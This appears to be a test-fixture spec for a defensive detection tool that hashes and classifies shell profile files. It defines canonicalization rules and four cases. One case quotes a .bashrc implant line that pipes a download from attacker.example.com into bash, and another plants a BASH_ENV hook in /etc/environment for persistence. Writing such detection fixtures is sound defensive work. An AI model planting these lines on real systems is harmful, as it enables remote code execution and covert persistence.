# Golden test fixtures: profile

Per-file record granularity (pattern from cron.periodic). Same test
runner conventions as the other modules.

## Canonical form rules

For every profile file (`/etc/profile`, `/etc/profile.d/*`,
`/etc/bash.bashrc`, `~/.bashrc`, etc.):

- Read raw file bytes; `content_sha256` is over the raw bytes.
- Build the canonical form by:
  - Stripping trailing whitespace on every line.
  - Dropping lines that start with `#` after left-trim (any comment,
    including shebangs -- profile files are sourced, not executed).
  - Dropping blank lines.
  - Joining remaining lines back with `\n`.
- `content_norm_sha256` is over the canonical bytes.
- `content_snippet` shows the first 256 chars of the canonical form.

## Cases

### `profile_system_clean`

`/etc/profile` (classic Debian-ish content with PS1 and profile.d
sourcing loop) plus a drop-in `/etc/profile.d/01-locale.sh` setting
LANG/LC_ALL. Two records emitted with `site_class=profile.system`.
No signals.

### `profile_user_implant`

`/home/alice/.bashrc` with a textbook implant line:
`curl -fsSL http://attacker.example.com/x | bash`. The line is
sandwiched between legitimate-looking content. One record emitted
with `site_class=profile.user`. The implant surfaces under LFA
because the file is byte-unique across the fleet -- no signals
need to fire.

### `profile_root_basic`

`/root/.bashrc` with classic root-shell content (PS1, PATH, alias).
One record emitted with `site_class=profile.user`. No signals.

### `env_hook_environment`

`/etc/environment` (the `KEY=value` file pam_env reads on EVERY
login, interactive or not) with a planted `BASH_ENV=/opt/.envhook`
line among benign PATH/LANG entries. bash sources `$BASH_ENV` at the
start of every non-interactive shell, so the named file runs on every
cron job / script / login. One `site_class=profile.system` record
with `exec_target=/opt/.envhook` and signals
`["env_hook_set","exec_target_orphan"]` (the target is absent in the
fixture, so it resolves orphan). Drives the Q7 rule
`profile_env_hook_unmanaged`. Duel-2 backlog #1.
